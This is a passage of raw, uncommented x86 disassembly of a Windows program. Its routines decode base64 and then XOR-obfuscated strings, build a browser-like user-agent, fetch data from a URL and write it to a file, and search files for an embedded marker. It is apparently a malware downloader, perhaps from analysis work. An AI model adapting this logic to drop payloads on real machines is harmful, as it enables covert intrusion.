  4015f8:	8a 47 fe             	mov    -0x2(%edi),%al
  4015fb:	50                   	push   %eax
  4015fc:	e8 ef 00 00 00       	call   0x4016f0
  401601:	83 c4 04             	add    $0x4,%esp
  401604:	85 c0                	test   %eax,%eax
  401606:	0f 8c b6 00 00 00    	jl     0x4016c2
  40160c:	8a 4f ff             	mov    -0x1(%edi),%cl
  40160f:	c1 e0 06             	shl    $0x6,%eax
  401612:	51                   	push   %ecx
  401613:	8b f0                	mov    %eax,%esi
  401615:	e8 d6 00 00 00       	call   0x4016f0
  40161a:	83 c4 04             	add    $0x4,%esp
  40161d:	85 c0                	test   %eax,%eax
  40161f:	0f 8c b3 00 00 00    	jl     0x4016d8
  401625:	03 f0                	add    %eax,%esi
  401627:	8a 07                	mov    (%edi),%al
  401629:	c1 e6 06             	shl    $0x6,%esi
  40162c:	3c 3d                	cmp    $0x3d,%al
  40162e:	75 07                	jne    0x401637
  401630:	bd 01 00 00 00       	mov    $0x1,%ebp
  401635:	eb 13                	jmp    0x40164a
  401637:	50                   	push   %eax
  401638:	e8 b3 00 00 00       	call   0x4016f0
  40163d:	83 c4 04             	add    $0x4,%esp
  401640:	85 c0                	test   %eax,%eax
  401642:	0f 8c 90 00 00 00    	jl     0x4016d8
  401648:	03 f0                	add    %eax,%esi
  40164a:	8a 47 01             	mov    0x1(%edi),%al
  40164d:	c1 e6 06             	shl    $0x6,%esi
  401650:	3c 3d                	cmp    $0x3d,%al
  401652:	8b de                	mov    %esi,%ebx
  401654:	75 18                	jne    0x40166e
  401656:	45                   	inc    %ebp
  401657:	83 fd 03             	cmp    $0x3,%ebp
  40165a:	7d 37                	jge    0x401693
  40165c:	8b 44 24 18          	mov    0x18(%esp),%eax
  401660:	8b d3                	mov    %ebx,%edx
  401662:	c1 fa 10             	sar    $0x10,%edx
  401665:	88 10                	mov    %dl,(%eax)
  401667:	40                   	inc    %eax
  401668:	89 44 24 18          	mov    %eax,0x18(%esp)
  40166c:	eb 29                	jmp    0x401697
  40166e:	85 ed                	test   %ebp,%ebp
  401670:	75 66                	jne    0x4016d8
  401672:	50                   	push   %eax
  401673:	e8 78 00 00 00       	call   0x4016f0
  401678:	83 c4 04             	add    $0x4,%esp
  40167b:	85 c0                	test   %eax,%eax
  40167d:	7c 59                	jl     0x4016d8
  40167f:	03 d8                	add    %eax,%ebx
  401681:	8b 44 24 18          	mov    0x18(%esp),%eax
  401685:	8b d3                	mov    %ebx,%edx
  401687:	c1 fa 10             	sar    $0x10,%edx
  40168a:	88 10                	mov    %dl,(%eax)
  40168c:	40                   	inc    %eax
  40168d:	89 44 24 18          	mov    %eax,0x18(%esp)
  401691:	eb 04                	jmp    0x401697
  401693:	8b 44 24 18          	mov    0x18(%esp),%eax
  401697:	83 fd 02             	cmp    $0x2,%ebp
  40169a:	7d 0c                	jge    0x4016a8
  40169c:	8b cb                	mov    %ebx,%ecx
  40169e:	c1 f9 08             	sar    $0x8,%ecx
  4016a1:	88 08                	mov    %cl,(%eax)
  4016a3:	40                   	inc    %eax
  4016a4:	89 44 24 18          	mov    %eax,0x18(%esp)
  4016a8:	83 fd 01             	cmp    $0x1,%ebp
  4016ab:	7d 07                	jge    0x4016b4
  4016ad:	88 18                	mov    %bl,(%eax)
  4016af:	40                   	inc    %eax
  4016b0:	89 44 24 18          	mov    %eax,0x18(%esp)
  4016b4:	8a 47 02             	mov    0x2(%edi),%al
  4016b7:	83 c7 04             	add    $0x4,%edi
  4016ba:	84 c0                	test   %al,%al
  4016bc:	0f 85 2e ff ff ff    	jne    0x4015f0
  4016c2:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4016c6:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4016ca:	8b 44 24 18          	mov    0x18(%esp),%eax
  4016ce:	5f                   	pop    %edi
  4016cf:	5e                   	pop    %esi
  4016d0:	5d                   	pop    %ebp
  4016d1:	89 0a                	mov    %ecx,(%edx)
  4016d3:	2b c1                	sub    %ecx,%eax
  4016d5:	5b                   	pop    %ebx
  4016d6:	59                   	pop    %ecx
  4016d7:	c3                   	ret
  4016d8:	5f                   	pop    %edi
  4016d9:	5e                   	pop    %esi
  4016da:	5d                   	pop    %ebp
  4016db:	83 c8 ff             	or     $0xffffffff,%eax
  4016de:	5b                   	pop    %ebx
  4016df:	59                   	pop    %ecx
  4016e0:	c3                   	ret
  4016e1:	90                   	nop
  4016e2:	90                   	nop
  4016e3:	90                   	nop
  4016e4:	90                   	nop
  4016e5:	90                   	nop
  4016e6:	90                   	nop
  4016e7:	90                   	nop
  4016e8:	90                   	nop
  4016e9:	90                   	nop
  4016ea:	90                   	nop
  4016eb:	90                   	nop
  4016ec:	90                   	nop
  4016ed:	90                   	nop
  4016ee:	90                   	nop
  4016ef:	90                   	nop
  4016f0:	83 ec 44             	sub    $0x44,%esp
  4016f3:	8a 54 24 48          	mov    0x48(%esp),%dl
  4016f7:	b1 41                	mov    $0x41,%cl
  4016f9:	88 4c 24 00          	mov    %cl,0x0(%esp)
  4016fd:	c6 44 24 01 42       	movb   $0x42,0x1(%esp)
  401702:	c6 44 24 02 43       	movb   $0x43,0x2(%esp)
  401707:	c6 44 24 03 44       	movb   $0x44,0x3(%esp)
  40170c:	c6 44 24 04 45       	movb   $0x45,0x4(%esp)
  401711:	c6 44 24 05 46       	movb   $0x46,0x5(%esp)
  401716:	c6 44 24 06 47       	movb   $0x47,0x6(%esp)
  40171b:	c6 44 24 07 48       	movb   $0x48,0x7(%esp)
  401720:	c6 44 24 08 49       	movb   $0x49,0x8(%esp)
  401725:	c6 44 24 09 4a       	movb   $0x4a,0x9(%esp)
  40172a:	c6 44 24 0a 4b       	movb   $0x4b,0xa(%esp)
  40172f:	c6 44 24 0b 4c       	movb   $0x4c,0xb(%esp)
  401734:	c6 44 24 0c 4d       	movb   $0x4d,0xc(%esp)
  401739:	c6 44 24 0d 4e       	movb   $0x4e,0xd(%esp)
  40173e:	c6 44 24 0e 4f       	movb   $0x4f,0xe(%esp)
  401743:	c6 44 24 0f 50       	movb   $0x50,0xf(%esp)
  401748:	c6 44 24 10 51       	movb   $0x51,0x10(%esp)
  40174d:	c6 44 24 11 52       	movb   $0x52,0x11(%esp)
  401752:	c6 44 24 12 53       	movb   $0x53,0x12(%esp)
  401757:	c6 44 24 13 54       	movb   $0x54,0x13(%esp)
  40175c:	c6 44 24 14 55       	movb   $0x55,0x14(%esp)
  401761:	c6 44 24 15 56       	movb   $0x56,0x15(%esp)
  401766:	c6 44 24 16 57       	movb   $0x57,0x16(%esp)
  40176b:	c6 44 24 17 58       	movb   $0x58,0x17(%esp)
  401770:	c6 44 24 18 59       	movb   $0x59,0x18(%esp)
  401775:	c6 44 24 19 5a       	movb   $0x5a,0x19(%esp)
  40177a:	c6 44 24 1a 61       	movb   $0x61,0x1a(%esp)
  40177f:	c6 44 24 1b 62       	movb   $0x62,0x1b(%esp)
  401784:	c6 44 24 1c 63       	movb   $0x63,0x1c(%esp)
  401789:	c6 44 24 1d 64       	movb   $0x64,0x1d(%esp)
  40178e:	c6 44 24 1e 65       	movb   $0x65,0x1e(%esp)
  401793:	c6 44 24 1f 66       	movb   $0x66,0x1f(%esp)
  401798:	c6 44 24 20 67       	movb   $0x67,0x20(%esp)
  40179d:	c6 44 24 21 68       	movb   $0x68,0x21(%esp)
  4017a2:	c6 44 24 22 69       	movb   $0x69,0x22(%esp)
  4017a7:	c6 44 24 23 6a       	movb   $0x6a,0x23(%esp)
  4017ac:	c6 44 24 24 6b       	movb   $0x6b,0x24(%esp)
  4017b1:	c6 44 24 25 6c       	movb   $0x6c,0x25(%esp)
  4017b6:	c6 44 24 26 6d       	movb   $0x6d,0x26(%esp)
  4017bb:	c6 44 24 27 6e       	movb   $0x6e,0x27(%esp)
  4017c0:	c6 44 24 28 6f       	movb   $0x6f,0x28(%esp)
  4017c5:	c6 44 24 29 70       	movb   $0x70,0x29(%esp)
  4017ca:	c6 44 24 2a 71       	movb   $0x71,0x2a(%esp)
  4017cf:	c6 44 24 2b 72       	movb   $0x72,0x2b(%esp)
  4017d4:	c6 44 24 2c 73       	movb   $0x73,0x2c(%esp)
  4017d9:	c6 44 24 2d 74       	movb   $0x74,0x2d(%esp)
  4017de:	c6 44 24 2e 75       	movb   $0x75,0x2e(%esp)
  4017e3:	c6 44 24 2f 76       	movb   $0x76,0x2f(%esp)
  4017e8:	c6 44 24 30 77       	movb   $0x77,0x30(%esp)
  4017ed:	c6 44 24 31 78       	movb   $0x78,0x31(%esp)
  4017f2:	c6 44 24 32 79       	movb   $0x79,0x32(%esp)
  4017f7:	c6 44 24 33 7a       	movb   $0x7a,0x33(%esp)
  4017fc:	c6 44 24 34 30       	movb   $0x30,0x34(%esp)
  401801:	c6 44 24 35 31       	movb   $0x31,0x35(%esp)
  401806:	c6 44 24 36 32       	movb   $0x32,0x36(%esp)
  40180b:	c6 44 24 37 33       	movb   $0x33,0x37(%esp)
  401810:	c6 44 24 38 34       	movb   $0x34,0x38(%esp)
  401815:	c6 44 24 39 35       	movb   $0x35,0x39(%esp)
  40181a:	c6 44 24 3a 36       	movb   $0x36,0x3a(%esp)
  40181f:	c6 44 24 3b 37       	movb   $0x37,0x3b(%esp)
  401824:	c6 44 24 3c 38       	movb   $0x38,0x3c(%esp)
  401829:	c6 44 24 3d 39       	movb   $0x39,0x3d(%esp)
  40182e:	c6 44 24 3e 2b       	movb   $0x2b,0x3e(%esp)
  401833:	c6 44 24 3f 2f       	movb   $0x2f,0x3f(%esp)
  401838:	c6 44 24 40 00       	movb   $0x0,0x40(%esp)
  40183d:	8d 44 24 00          	lea    0x0(%esp),%eax
  401841:	3a ca                	cmp    %dl,%cl
  401843:	74 0f                	je     0x401854
  401845:	8a 48 01             	mov    0x1(%eax),%cl
  401848:	40                   	inc    %eax
  401849:	84 c9                	test   %cl,%cl
  40184b:	75 f4                	jne    0x401841
  40184d:	83 c8 ff             	or     $0xffffffff,%eax
  401850:	83 c4 44             	add    $0x44,%esp
  401853:	c3                   	ret
  401854:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  401858:	2b c1                	sub    %ecx,%eax
  40185a:	83 c4 44             	add    $0x44,%esp
  40185d:	c3                   	ret
  40185e:	90                   	nop
  40185f:	90                   	nop
  401860:	51                   	push   %ecx
  401861:	c7 44 24 00 00 00 00 	movl   $0x0,0x0(%esp)
  401868:	00 
  401869:	e8 b2 09 00 00       	call   0x402220
  40186e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401872:	8d 44 24 00          	lea    0x0(%esp),%eax
  401876:	50                   	push   %eax
  401877:	51                   	push   %ecx
  401878:	e8 43 fd ff ff       	call   0x4015c0
  40187d:	83 c4 08             	add    $0x8,%esp
  401880:	33 c9                	xor    %ecx,%ecx
  401882:	85 c0                	test   %eax,%eax
  401884:	7e 27                	jle    0x4018ad
  401886:	53                   	push   %ebx
  401887:	8b 54 24 04          	mov    0x4(%esp),%edx
  40188b:	8a 1c 11             	mov    (%ecx,%edx,1),%bl
  40188e:	80 c3 7a             	add    $0x7a,%bl
  401891:	88 1c 11             	mov    %bl,(%ecx,%edx,1)
  401894:	8b 54 24 04          	mov    0x4(%esp),%edx
  401898:	8a 1c 11             	mov    (%ecx,%edx,1),%bl
  40189b:	80 f3 59             	xor    $0x59,%bl
  40189e:	88 1c 11             	mov    %bl,(%ecx,%edx,1)
  4018a1:	41                   	inc    %ecx
  4018a2:	3b c8                	cmp    %eax,%ecx
  4018a4:	7c e1                	jl     0x401887
  4018a6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4018aa:	5b                   	pop    %ebx
  4018ab:	59                   	pop    %ecx
  4018ac:	c3                   	ret
  4018ad:	8b 44 24 00          	mov    0x0(%esp),%eax
  4018b1:	59                   	pop    %ecx
  4018b2:	c3                   	ret
  4018b3:	90                   	nop
  4018b4:	90                   	nop
  4018b5:	90                   	nop
  4018b6:	90                   	nop
  4018b7:	90                   	nop
  4018b8:	90                   	nop
  4018b9:	90                   	nop
  4018ba:	90                   	nop
  4018bb:	90                   	nop
  4018bc:	90                   	nop
  4018bd:	90                   	nop
  4018be:	90                   	nop
  4018bf:	90                   	nop
  4018c0:	81 ec 28 04 00 00    	sub    $0x428,%esp
  4018c6:	53                   	push   %ebx
  4018c7:	56                   	push   %esi
  4018c8:	33 db                	xor    %ebx,%ebx
  4018ca:	57                   	push   %edi
  4018cb:	b0 6c                	mov    $0x6c,%al
  4018cd:	53                   	push   %ebx
  4018ce:	88 44 24 14          	mov    %al,0x14(%esp)
  4018d2:	88 44 24 15          	mov    %al,0x15(%esp)
  4018d6:	88 44 24 25          	mov    %al,0x25(%esp)
  4018da:	53                   	push   %ebx
  4018db:	53                   	push   %ebx
  4018dc:	8d 44 24 18          	lea    0x18(%esp),%eax
  4018e0:	b2 69                	mov    $0x69,%dl
  4018e2:	b1 61                	mov    $0x61,%cl
  4018e4:	53                   	push   %ebx
  4018e5:	50                   	push   %eax
  4018e6:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  4018ea:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  4018ee:	c6 44 24 20 4d       	movb   $0x4d,0x20(%esp)
  4018f3:	c6 44 24 21 6f       	movb   $0x6f,0x21(%esp)
  4018f8:	c6 44 24 22 7a       	movb   $0x7a,0x22(%esp)
  4018fd:	88 54 24 23          	mov    %dl,0x23(%esp)
  401901:	88 4c 24 26          	mov    %cl,0x26(%esp)
  401905:	c6 44 24 27 2f       	movb   $0x2f,0x27(%esp)
  40190a:	c6 44 24 28 34       	movb   $0x34,0x28(%esp)
  40190f:	c6 44 24 29 2e       	movb   $0x2e,0x29(%esp)
  401914:	c6 44 24 2a 30       	movb   $0x30,0x2a(%esp)
  401919:	c6 44 24 2b 20       	movb   $0x20,0x2b(%esp)
  40191e:	c6 44 24 2c 28       	movb   $0x28,0x2c(%esp)
  401923:	c6 44 24 2d 63       	movb   $0x63,0x2d(%esp)
  401928:	c6 44 24 2e 6f       	movb   $0x6f,0x2e(%esp)
  40192d:	c6 44 24 2f 6d       	movb   $0x6d,0x2f(%esp)
  401932:	c6 44 24 30 70       	movb   $0x70,0x30(%esp)
  401937:	88 4c 24 31          	mov    %cl,0x31(%esp)
  40193b:	c6 44 24 32 74       	movb   $0x74,0x32(%esp)
  401940:	88 54 24 33          	mov    %dl,0x33(%esp)
  401944:	c6 44 24 34 62       	movb   $0x62,0x34(%esp)
  401949:	c6 44 24 36 65       	movb   $0x65,0x36(%esp)
  40194e:	c6 44 24 37 29       	movb   $0x29,0x37(%esp)
  401953:	88 5c 24 38          	mov    %bl,0x38(%esp)
  401957:	ff 15 a0 30 40 00    	call   *0x4030a0
  40195d:	8b f8                	mov    %eax,%edi
  40195f:	3b fb                	cmp    %ebx,%edi
  401961:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  401965:	75 0c                	jne    0x401973
  401967:	5f                   	pop    %edi
  401968:	5e                   	pop    %esi
  401969:	33 c0                	xor    %eax,%eax
  40196b:	5b                   	pop    %ebx
  40196c:	81 c4 28 04 00 00    	add    $0x428,%esp
  401972:	c3                   	ret
  401973:	8b 8c 24 38 04 00 00 	mov    0x438(%esp),%ecx
  40197a:	53                   	push   %ebx
  40197b:	68 00 00 00 80       	push   $0x80000000
  401980:	53                   	push   %ebx
  401981:	53                   	push   %ebx
  401982:	51                   	push   %ecx
  401983:	57                   	push   %edi
  401984:	ff 15 a4 30 40 00    	call   *0x4030a4
  40198a:	8b f0                	mov    %eax,%esi
  40198c:	3b f3                	cmp    %ebx,%esi
  40198e:	75 0c                	jne    0x40199c
  401990:	5f                   	pop    %edi
  401991:	5e                   	pop    %esi
  401992:	33 c0                	xor    %eax,%eax
  401994:	5b                   	pop    %ebx
  401995:	81 c4 28 04 00 00    	add    $0x428,%esp
  40199b:	c3                   	ret
  40199c:	8b 94 24 3c 04 00 00 	mov    0x43c(%esp),%edx
  4019a3:	55                   	push   %ebp
  4019a4:	53                   	push   %ebx
  4019a5:	53                   	push   %ebx
  4019a6:	6a 02                	push   $0x2
  4019a8:	53                   	push   %ebx
  4019a9:	53                   	push   %ebx
  4019aa:	68 00 00 00 40       	push   $0x40000000
  4019af:	52                   	push   %edx
  4019b0:	ff 15 00 30 40 00    	call   *0x403000
  4019b6:	8b e8                	mov    %eax,%ebp
  4019b8:	83 fd ff             	cmp    $0xffffffff,%ebp
  4019bb:	74 55                	je     0x401a12
  4019bd:	8b 1d ac 30 40 00    	mov    0x4030ac,%ebx
  4019c3:	b9 00 01 00 00       	mov    $0x100,%ecx
  4019c8:	33 c0                	xor    %eax,%eax
  4019ca:	8d 7c 24 38          	lea    0x38(%esp),%edi
  4019ce:	f3 ab                	rep stos %eax,%es:(%edi)
  4019d0:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4019d4:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  4019d8:	50                   	push   %eax
  4019d9:	68 00 04 00 00       	push   $0x400
  4019de:	51                   	push   %ecx
  4019df:	56                   	push   %esi
  4019e0:	ff d3                	call   *%ebx
  4019e2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4019e6:	8d 54 24 34          	lea    0x34(%esp),%edx
  4019ea:	6a 00                	push   $0x0
  4019ec:	52                   	push   %edx
  4019ed:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  4019f1:	50                   	push   %eax
  4019f2:	51                   	push   %ecx
  4019f3:	55                   	push   %ebp
  4019f4:	ff 15 04 30 40 00    	call   *0x403004
  4019fa:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4019fe:	85 c0                	test   %eax,%eax
  401a00:	77 c1                	ja     0x4019c3
  401a02:	55                   	push   %ebp
  401a03:	ff 15 08 30 40 00    	call   *0x403008
  401a09:	8b 7c 24 30          	mov    0x30(%esp),%edi
  401a0d:	bb 01 00 00 00       	mov    $0x1,%ebx
  401a12:	56                   	push   %esi
  401a13:	8b 35 a8 30 40 00    	mov    0x4030a8,%esi
  401a19:	ff d6                	call   *%esi
  401a1b:	57                   	push   %edi
  401a1c:	ff d6                	call   *%esi
  401a1e:	5d                   	pop    %ebp
  401a1f:	5f                   	pop    %edi
  401a20:	8b c3                	mov    %ebx,%eax
  401a22:	5e                   	pop    %esi
  401a23:	5b                   	pop    %ebx
  401a24:	81 c4 28 04 00 00    	add    $0x428,%esp
  401a2a:	c3                   	ret
  401a2b:	90                   	nop
  401a2c:	90                   	nop
  401a2d:	90                   	nop
  401a2e:	90                   	nop
  401a2f:	90                   	nop
  401a30:	53                   	push   %ebx
  401a31:	55                   	push   %ebp
  401a32:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401a36:	56                   	push   %esi
  401a37:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401a3b:	57                   	push   %edi
  401a3c:	85 f6                	test   %esi,%esi
  401a3e:	75 0b                	jne    0x401a4b
  401a40:	55                   	push   %ebp
  401a41:	e8 ba 07 00 00       	call   0x402200
  401a46:	83 c4 04             	add    $0x4,%esp
  401a49:	8b f0                	mov    %eax,%esi
  401a4b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401a4f:	33 ff                	xor    %edi,%edi
  401a51:	85 c0                	test   %eax,%eax
  401a53:	7e 27                	jle    0x401a7c
  401a55:	8b 44 24 14          	mov    0x14(%esp),%eax
  401a59:	33 c9                	xor    %ecx,%ecx
  401a5b:	85 f6                	test   %esi,%esi
  401a5d:	7e 10                	jle    0x401a6f
  401a5f:	8d 14 07             	lea    (%edi,%eax,1),%edx
  401a62:	8a 1c 0a             	mov    (%edx,%ecx,1),%bl
  401a65:	3a 1c 29             	cmp    (%ecx,%ebp,1),%bl
  401a68:	75 05                	jne    0x401a6f
  401a6a:	41                   	inc    %ecx
  401a6b:	3b ce                	cmp    %esi,%ecx
  401a6d:	7c f3                	jl     0x401a62
  401a6f:	3b ce                	cmp    %esi,%ecx
  401a71:	74 11                	je     0x401a84
  401a73:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401a77:	47                   	inc    %edi
  401a78:	3b f9                	cmp    %ecx,%edi
  401a7a:	7c dd                	jl     0x401a59
  401a7c:	5f                   	pop    %edi
  401a7d:	5e                   	pop    %esi
  401a7e:	5d                   	pop    %ebp
  401a7f:	83 c8 ff             	or     $0xffffffff,%eax
  401a82:	5b                   	pop    %ebx
  401a83:	c3                   	ret
  401a84:	8b c7                	mov    %edi,%eax
  401a86:	5f                   	pop    %edi
  401a87:	5e                   	pop    %esi
  401a88:	5d                   	pop    %ebp
  401a89:	5b                   	pop    %ebx
  401a8a:	c3                   	ret
  401a8b:	90                   	nop
  401a8c:	90                   	nop
  401a8d:	90                   	nop
  401a8e:	90                   	nop
  401a8f:	90                   	nop
  401a90:	51                   	push   %ecx
  401a91:	53                   	push   %ebx
  401a92:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401a96:	56                   	push   %esi
  401a97:	57                   	push   %edi
  401a98:	6a 02                	push   $0x2
  401a9a:	6a 00                	push   $0x0
  401a9c:	68 00 fc ff ff       	push   $0xfffffc00
  401aa1:	53                   	push   %ebx
  401aa2:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401aa9:	00 
  401aaa:	ff 15 38 30 40 00    	call   *0x403038
  401ab0:	6a 00                	push   $0x0
  401ab2:	53                   	push   %ebx
  401ab3:	ff 15 34 30 40 00    	call   *0x403034
  401ab9:	8b f0                	mov    %eax,%esi
  401abb:	8d 46 01             	lea    0x1(%esi),%eax
  401abe:	50                   	push   %eax
  401abf:	e8 84 07 00 00       	call   0x402248
  401ac4:	83 c4 04             	add    $0x4,%esp
  401ac7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401acb:	8b f8                	mov    %eax,%edi
  401acd:	6a 00                	push   $0x0
  401acf:	51                   	push   %ecx
  401ad0:	56                   	push   %esi
  401ad1:	57                   	push   %edi
  401ad2:	53                   	push   %ebx
  401ad3:	ff 15 48 30 40 00    	call   *0x403048
  401ad9:	8b 54 24 18          	mov    0x18(%esp),%edx
  401add:	6a 00                	push   $0x0
  401adf:	56                   	push   %esi
  401ae0:	52                   	push   %edx
  401ae1:	57                   	push   %edi
  401ae2:	e8 49 ff ff ff       	call   0x401a30
  401ae7:	83 c4 10             	add    $0x10,%esp
  401aea:	83 f8 ff             	cmp    $0xffffffff,%eax
  401aed:	74 07                	je     0x401af6
  401aef:	03 c7                	add    %edi,%eax
  401af1:	5f                   	pop    %edi
  401af2:	5e                   	pop    %esi
  401af3:	5b                   	pop    %ebx
  401af4:	59                   	pop    %ecx
  401af5:	c3                   	ret
  401af6:	57                   	push   %edi
  401af7:	e8 46 07 00 00       	call   0x402242
  401afc:	83 c4 04             	add    $0x4,%esp
  401aff:	33 c0                	xor    %eax,%eax
  401b01:	5f                   	pop    %edi
  401b02:	5e                   	pop    %esi
  401b03:	5b                   	pop    %ebx
  401b04:	59                   	pop    %ecx
  401b05:	c3                   	ret
  401b06:	90                   	nop
  401b07:	90                   	nop
  401b08:	90                   	nop
  401b09:	90                   	nop
  401b0a:	90                   	nop
  401b0b:	90                   	nop
  401b0c:	90                   	nop
  401b0d:	90                   	nop
  401b0e:	90                   	nop
  401b0f:	90                   	nop
  401b10:	8a 44 24 04          	mov    0x4(%esp),%al
  401b14:	56                   	push   %esi
  401b15:	8b 35 00 30 40 00    	mov    0x403000,%esi
  401b1b:	6a 00                	push   $0x0
  401b1d:	6a 00                	push   $0x0
  401b1f:	6a 03                	push   $0x3
  401b21:	6a 00                	push   $0x0
  401b23:	6a 01                	push   $0x1
  401b25:	68 00 00 00 80       	push   $0x80000000
  401b2a:	68 c0 44 40 00       	push   $0x4044c0
  401b2f:	a2 c0 44 40 00       	mov    %al,0x4044c0
  401b34:	ff d6                	call   *%esi
  401b36:	83 f8 ff             	cmp    $0xffffffff,%eax
  401b39:	75 2a                	jne    0x401b65
  401b3b:	68 c0 44 40 00       	push   $0x4044c0
  401b40:	ff 15 b4 30 40 00    	call   *0x4030b4
  401b46:	6a 00                	push   $0x0
  401b48:	6a 00                	push   $0x0
  401b4a:	6a 02                	push   $0x2
  401b4c:	6a 00                	push   $0x0
  401b4e:	6a 00                	push   $0x0
  401b50:	68 00 00 00 40       	push   $0x40000000
  401b55:	68 c0 44 40 00       	push   $0x4044c0
  401b5a:	ff d6                	call   *%esi
  401b5c:	83 f8 ff             	cmp    $0xffffffff,%eax
  401b5f:	75 04                	jne    0x401b65
  401b61:	33 c0                	xor    %eax,%eax
  401b63:	5e                   	pop    %esi
  401b64:	c3                   	ret
  401b65:	50                   	push   %eax
  401b66:	ff 15 08 30 40 00    	call   *0x403008
  401b6c:	b8 01 00 00 00       	mov    $0x1,%eax
  401b71:	5e                   	pop    %esi
  401b72:	c3                   	ret
  401b73:	90                   	nop
  401b74:	90                   	nop
  401b75:	90                   	nop
  401b76:	90                   	nop
  401b77:	90                   	nop
  401b78:	90                   	nop
  401b79:	90                   	nop
  401b7a:	90                   	nop
  401b7b:	90                   	nop
  401b7c:	90                   	nop
  401b7d:	90                   	nop
  401b7e:	90                   	nop
  401b7f:	90                   	nop
  401b80:	83 ec 1c             	sub    $0x1c,%esp
  401b83:	b1 72                	mov    $0x72,%cl
  401b85:	b0 5c                	mov    $0x5c,%al
  401b87:	88 4c 24 04          	mov    %cl,0x4(%esp)
  401b8b:	88 4c 24 07          	mov    %cl,0x7(%esp)
  401b8f:	b1 70                	mov    $0x70,%cl
  401b91:	53                   	push   %ebx
  401b92:	57                   	push   %edi
  401b93:	88 44 24 0a          	mov    %al,0xa(%esp)
  401b97:	88 44 24 18          	mov    %al,0x18(%esp)
  401b9b:	88 4c 24 1a          	mov    %cl,0x1a(%esp)
  401b9f:	88 4c 24 1b          	mov    %cl,0x1b(%esp)
  401ba3:	88 44 24 21          	mov    %al,0x21(%esp)
  401ba7:	b9 41 00 00 00       	mov    $0x41,%ecx
  401bac:	33 c0                	xor    %eax,%eax
  401bae:	bf c0 44 40 00       	mov    $0x4044c0,%edi
  401bb3:	b3 50                	mov    $0x50,%bl
  401bb5:	f3 ab                	rep stos %eax,%es:(%edi)
  401bb7:	8d 44 24 08          	lea    0x8(%esp),%eax
  401bbb:	88 5c 24 0b          	mov    %bl,0xb(%esp)
  401bbf:	88 5c 24 1c          	mov    %bl,0x1c(%esp)
  401bc3:	b2 61                	mov    $0x61,%dl
  401bc5:	32 db                	xor    %bl,%bl
  401bc7:	50                   	push   %eax
  401bc8:	68 c0 44 40 00       	push   $0x4044c0
  401bcd:	c6 44 24 10 43       	movb   $0x43,0x10(%esp)
  401bd2:	c6 44 24 11 3a       	movb   $0x3a,0x11(%esp)
  401bd7:	c6 44 24 15 6f       	movb   $0x6f,0x15(%esp)
  401bdc:	c6 44 24 16 67       	movb   $0x67,0x16(%esp)
  401be1:	88 54 24 18          	mov    %dl,0x18(%esp)
  401be5:	c6 44 24 19 6d       	movb   $0x6d,0x19(%esp)
  401bea:	c6 44 24 1a 20       	movb   $0x20,0x1a(%esp)
  401bef:	c6 44 24 1b 46       	movb   $0x46,0x1b(%esp)
  401bf4:	c6 44 24 1c 69       	movb   $0x69,0x1c(%esp)
  401bf9:	c6 44 24 1d 6c       	movb   $0x6c,0x1d(%esp)
  401bfe:	c6 44 24 1e 65       	movb   $0x65,0x1e(%esp)
  401c03:	c6 44 24 1f 73       	movb   $0x73,0x1f(%esp)
  401c08:	c6 44 24 21 41       	movb   $0x41,0x21(%esp)
  401c0d:	88 54 24 25          	mov    %dl,0x25(%esp)
  401c11:	c6 44 24 26 74       	movb   $0x74,0x26(%esp)
  401c16:	c6 44 24 27 63       	movb   $0x63,0x27(%esp)
  401c1b:	c6 44 24 28 68       	movb   $0x68,0x28(%esp)
  401c20:	88 5c 24 2a          	mov    %bl,0x2a(%esp)
  401c24:	e8 a7 05 00 00       	call   0x4021d0
  401c29:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401c2d:	51                   	push   %ecx
  401c2e:	68 c0 44 40 00       	push   $0x4044c0
  401c33:	e8 98 05 00 00       	call   0x4021d0
  401c38:	83 c4 10             	add    $0x10,%esp
  401c3b:	8a d3                	mov    %bl,%dl
  401c3d:	80 c2 43             	add    $0x43,%dl
  401c40:	52                   	push   %edx
  401c41:	e8 ca fe ff ff       	call   0x401b10
  401c46:	83 c4 04             	add    $0x4,%esp
  401c49:	85 c0                	test   %eax,%eax
  401c4b:	75 0d                	jne    0x401c5a
  401c4d:	fe c3                	inc    %bl
  401c4f:	80 fb 04             	cmp    $0x4,%bl
  401c52:	7c e7                	jl     0x401c3b
  401c54:	5f                   	pop    %edi
  401c55:	5b                   	pop    %ebx
  401c56:	83 c4 1c             	add    $0x1c,%esp
  401c59:	c3                   	ret
  401c5a:	5f                   	pop    %edi
  401c5b:	b8 01 00 00 00       	mov    $0x1,%eax
  401c60:	5b                   	pop    %ebx
  401c61:	83 c4 1c             	add    $0x1c,%esp
  401c64:	c3                   	ret
  401c65:	90                   	nop
  401c66:	90                   	nop
  401c67:	90                   	nop
  401c68:	90                   	nop
  401c69:	90                   	nop
  401c6a:	90                   	nop
  401c6b:	90                   	nop
  401c6c:	90                   	nop
  401c6d:	90                   	nop
  401c6e:	90                   	nop
  401c6f:	90                   	nop
  401c70:	81 ec 00 04 00 00    	sub    $0x400,%esp
  401c76:	53                   	push   %ebx
  401c77:	55                   	push   %ebp
  401c78:	56                   	push   %esi
  401c79:	57                   	push   %edi
  401c7a:	33 db                	xor    %ebx,%ebx
  401c7c:	33 f6                	xor    %esi,%esi
  401c7e:	b9 ff 00 00 00       	mov    $0xff,%ecx
  401c83:	33 c0                	xor    %eax,%eax
  401c85:	8d 7c 24 14          	lea    0x14(%esp),%edi
